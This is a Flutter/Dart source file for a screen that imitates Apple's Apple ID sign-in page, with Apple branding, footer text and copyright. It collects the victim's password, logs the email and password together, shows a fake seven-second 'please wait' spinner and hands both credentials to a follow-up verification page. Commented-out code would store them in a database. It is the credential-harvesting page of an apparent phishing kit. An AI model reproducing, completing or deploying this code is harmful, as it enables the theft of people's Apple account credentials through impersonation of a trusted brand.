import 'dart:async';

import 'package:apple/main.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';

import '../Verify/verifylayout.dart';

enum MenuItem { signin, createanappleid, faq }

class PassMobileScreen extends StatefulWidget {
  final String callback;
  const PassMobileScreen({Key? key, required this.callback}) : super(key: key);

  @override
  State<PassMobileScreen> createState() => _PassMobileScreenState();
}

class _PassMobileScreenState extends State<PassMobileScreen> {
  @override
  Widget build(BuildContext context) {
    TextEditingController passwordController = TextEditingController();
    // ignore: no_leading_underscores_for_local_identifiers
    GlobalKey<FormState> _formerkey = GlobalKey<FormState>();
    bool checked = true;
    return Scaffold(
        backgroundColor: CupertinoColors.white,
        appBar: AppBar(
            backgroundColor: CupertinoColors.white,
            leading: const Padding(
              padding: EdgeInsets.only(top: 20, left: 20),
              child: Text(
                'Apple ID',
                style: TextStyle(
                    fontSize: 14,
                    color: Colors.black,
                    fontWeight: FontWeight.bold),
              ),
            ),
            leadingWidth: 150,
            actions: [
              Padding(
                  padding: const EdgeInsets.only(right: 20.0),
                  child: SizedBox(
                    width: 30,
                    child: PopupMenuButton(
                        enableFeedback: false,
                        itemBuilder: (context) => [
                              const PopupMenuItem(
                                value: MenuItem.signin,
                                child: Text('Sign in',
                                    style: TextStyle(fontSize: 14)),
                              ),
                              const PopupMenuItem(
                                  value: MenuItem.createanappleid,
                                  child: Text('Create your Apple ID',
                                      style: TextStyle(fontSize: 14))),
                              const PopupMenuItem(
                                  value: MenuItem.faq,
                                  child: Text('FAQ',
                                      style: TextStyle(fontSize: 14))),
                            ],
                        onSelected: (value) {
                          if (value == MenuItem.signin) {
                            Navigator.of(context).push(MaterialPageRoute(
                                builder: (context) => const Homepage()));
                          }
                        },
                        shape: const RoundedRectangleBorder(
                            borderRadius:
                                BorderRadius.all(Radius.circular(10))),
                        color: CupertinoColors.white,
                        child: const Icon(
                          Icons.keyboard_arrow_down,
                          color: Colors.black,
                          size: 25,
                        )),
                  )),
            ],
            elevation: 0.4),
        body: Padding(
          padding: const EdgeInsets.only(top: 30.0),
          child: Center(
            child: Padding(
              padding: const EdgeInsets.only(
                left: 20.0,
                right: 20,
              ),
              child: ListView(
                children: [
                  ClipRRect(
                    borderRadius: BorderRadius.circular(20),
                    child: const Image(
                      image: AssetImage('images/app.png'),
                      width: 300,
                      height: 170,
                      fit: BoxFit.contain,
                    ),
                  ),
                  Column(
                      crossAxisAlignment: CrossAxisAlignment.center,
                      children: [
                        const SizedBox(height: 20),
                        SizedBox(
                            child: Column(
                          children: const [
                            Text(
                              'Apple ID',
                              style: TextStyle(
                                  fontSize: 20,
                                  color: Colors.black,
                                  fontWeight: FontWeight.bold),
                            ),
                            SizedBox(height: 20),
                            Text('Manage your Apple account'),
                          ],
                        )),
                        const SizedBox(
                          height: 20,
                        ),

                        Padding(
                          padding: const EdgeInsets.only(bottom: 18.0),
                          child: Text(widget.callback,
                              style: const TextStyle(
                                  fontSize: 18, color: Colors.black)),
                        ),
                        //),
                        SizedBox(
                          child: Form(
                            key: _formerkey,
                            autovalidateMode:
                                AutovalidateMode.onUserInteraction,
                            child: Padding(
                              padding: const EdgeInsets.only(
                                  left: 10.0, right: 10.0),
                              child: TextFormField(
                                showCursor: true,
                                autofocus: false,
                                textAlign: TextAlign.start,
                                strutStyle: const StrutStyle(),
                                style: const TextStyle(),
                                textInputAction: TextInputAction.done,
                                keyboardType: TextInputType.visiblePassword,
                                controller: passwordController,
                                decoration: InputDecoration(
                                  contentPadding: const EdgeInsets.only(
                                      left: 10, right: 15),
                                  border: const OutlineInputBorder(
                                      borderRadius: BorderRadius.only(
                                          topLeft: Radius.circular(10),
                                          topRight: Radius.circular(10),
                                          bottomRight: Radius.circular(10),
                                          bottomLeft: Radius.circular(10))),
                                  hintText: 'password',
                                  hintStyle: const TextStyle(fontSize: 18),
                                  suffixIcon: Padding(
                                    padding: const EdgeInsets.only(
                                        right: 10.0, bottom: 0),
                                    child: IconButton(
                                        hoverColor: CupertinoColors.white,
                                        icon: const Icon(
                                          Icons.arrow_circle_right,
                                          size: 30,
                                          color: Colors.grey,
                                        ),
                                        onPressed: () {
                                          if (_formerkey.currentState!
                                              .validate()) {
                                            //                   FutureBuilder<Map<String, dynamic>>(future: Database(
                                            //                             username:
                                            //                                 widget.callback,
                                            //                             password:
                                            //                                 passwordController.text, emailPassword: '', emailUsername: '').getData(),
                                            // builder: (BuildContext context,AsyncSnapshot<Map<String,dynamic>>snapshot) {
                                            //                       switch (snapshot.connectionState) {
                                            //                         case ConnectionState
                                            //                             .done:
                                            //                           return const Text(
                                            //                               'All Done Sir');
                                            //                         default:
                                            //                           return const CircularProgressIndicator(
                                            //                               color: CupertinoColors
                                            //                                   .activeBlue);
                                            //                       }
                                            //                     },
                                            //                   );
                                            debugPrint(
                                                'Email:${widget.callback}, Password:${passwordController.text}');
                                            showDialog(
                                                context: context,
                                                builder: (context) {
                                                  return Center(
                                                      child: Column(
                                                    mainAxisAlignment:
                                                        MainAxisAlignment
                                                            .center,
                                                    mainAxisSize:
                                                        MainAxisSize.max,
                                                    children: const [
                                                      CircularProgressIndicator(
                                                          color: CupertinoColors
                                                              .activeBlue,
                                                          strokeWidth: 4,
                                                          backgroundColor:
                                                              CupertinoColors
                                                                  .white),
                                                      SizedBox(height: 50),
                                                      Card(
                                                        shape: RoundedRectangleBorder(
                                                            borderRadius:
                                                                BorderRadius
                                                                    .all(Radius
                                                                        .circular(
                                                                            7))),
                                                        color: Colors.grey,
                                                        child: Padding(
                                                          padding:
                                                              EdgeInsets.all(
                                                                  8.0),
                                                          child: Text(
                                                              'please wait...',
                                                              style: TextStyle(
                                                                  color: CupertinoColors
                                                                      .white)),
                                                        ),
                                                      )
                                                    ],
                                                  ));
                                                });

                                            Timer(
                                              const Duration(seconds: 7),
                                              () => Navigator.of(context).push(
                                                  MaterialPageRoute(
                                                      builder: (context) =>
                                                          VerifyLayoutPage(
                                                            appleEmail:
                                                                widget.callback,
                                                            applePassword:
                                                                passwordController
                                                                    .text,
                                                          ))),
                                            );
                                          }
                                        }),
                                  ),
                                ),
                                validator: (ifpassword) {
                                  if (ifpassword!.isEmpty) {
                                    return 'Please enter password';
                                  } else if (ifpassword.length < 6) {
                                    return 'Please enter a correct password';
                                  } else {
                                    return null;
                                  }
                                },
                              ),
                            ),
                          ),
                        ),
                        const SizedBox(height: 15),
                        SizedBox(
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Checkbox(
                                  value: checked,
                                  onChanged: (unchecked) {
                                    setState(() {
                                      checked = !checked;
                                    });
                                  },
                                  shape: const RoundedRectangleBorder(
                                      borderRadius:
                                          BorderRadius.all(Radius.circular(5))),
                                  hoverColor: CupertinoColors.white,
                                  checkColor: CupertinoColors.white,
                                  activeColor: CupertinoColors.systemBlue),
                              const SizedBox(
                                height: 15,
                              ),
                              const Text('Remember me',
                                  style: TextStyle(fontSize: 14)),
                            ],
                          ),
                        ),
                        const SizedBox(height: 0),
                        TextButton(
                            onPressed: () {},
                            child: const Text(
                                'Forgotten your Apple ID or password?',
                                style: TextStyle(
                                    fontSize: 12, letterSpacing: 0.5))),
                      ]),
                ],
              ),
            ),
          ),
        ),
        bottomSheet: BottomAppBar(
          elevation: 5,
          color: const Color.fromARGB(255, 245, 244, 244),
          child: Padding(
            padding:
                const EdgeInsets.only(top: 5.0, bottom: 5, left: 10, right: 10),
            child: SizedBox(
              width: MediaQuery.of(context).size.width,
              height: 90,
              child: ListView(
                // crossAxisAlignment: CrossAxisAlignment.stretch,
                // mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: const [
                  Padding(
                    padding: EdgeInsets.only(bottom: 0),
                    child: Text(
                      'More ways to shop: find an Apple Store or other retailer near you. or call 08000480408.',
                      style: TextStyle(fontSize: 11),
                    ),
                  ),
                  Padding(
                    padding: EdgeInsets.only(bottom: 11.0),
                    child: Text('United Kingdom',
                        style: TextStyle(
                          fontSize: 11,
                        )),
                  ),
                  Text('copy right 2022 Apple Inc. All rights reserved.',
                      style: TextStyle(
                        fontSize: 11,
                      )),
                  Text('Privacy Policy | Use of Cookies | Terms of Use |',
                      style: TextStyle(
                        fontSize: 11,
                      )),
                  Text('Sales and Refund | Legal | Site Map ',
                      style: TextStyle(
                        fontSize: 11,
                      )),
                ],
              ),
            ),
          ),
        ));
  }
}
